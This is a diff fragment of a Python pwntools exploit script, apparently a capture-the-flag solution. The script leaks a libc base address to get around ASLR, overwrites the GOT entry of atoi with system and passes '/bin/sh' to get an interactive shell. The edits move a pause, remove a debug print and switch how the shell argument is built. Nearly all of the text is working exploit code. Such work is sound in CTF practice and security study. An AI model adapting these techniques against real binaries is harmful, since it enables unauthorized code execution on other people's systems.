@@ -104,7 +104,6 @@ while step < 7:
         r.sendlineafter('6]:', str(offset + 2))
 
         r_out = 'Chose the number ' + str(offset + 1) +': '
-        pause()
         r.sendlineafter(r_out, '0')
         print('finished sending number and payload for step  %d: ' % (step))
 
@@ -113,7 +112,6 @@ while step < 7:
     # Step 5: Hijack GOT table of atoi, change it to system
     elif step == 5:
         libc_base_addr = u64(r.recv(6) + '\0\0') - 0x21ab0
-        print('get ASLR libc_base_addr: ', hex(libc_base_addr))
         for i in range(0, 6):
             r_out = 'Chose the number ' + str(i) + ': '
             r.sendlineafter(r_out, str(i))
@@ -133,10 +131,11 @@ while step < 7:
 
     # Step 6: Write the rest of padding zeros in front of the starting address of step 5
     elif step == 6:
+        pause()
         cnt_num = 0
         r_out = 'Chose the number 0:'
-        # hijack = libc_base_addr + binsh_offset --> strange bug
-        hijack= '/bin/sh'
+        hijack = libc_base_addr + binsh_offset # --> strange bug, PWN but no flag
+        # hijack= '/bin/sh' # --> PWN and with flag
         r.sendlineafter(r_out, str(hijack))
         print('finished sending number and payload for step  %d: ' % (step))
         r.interactive()
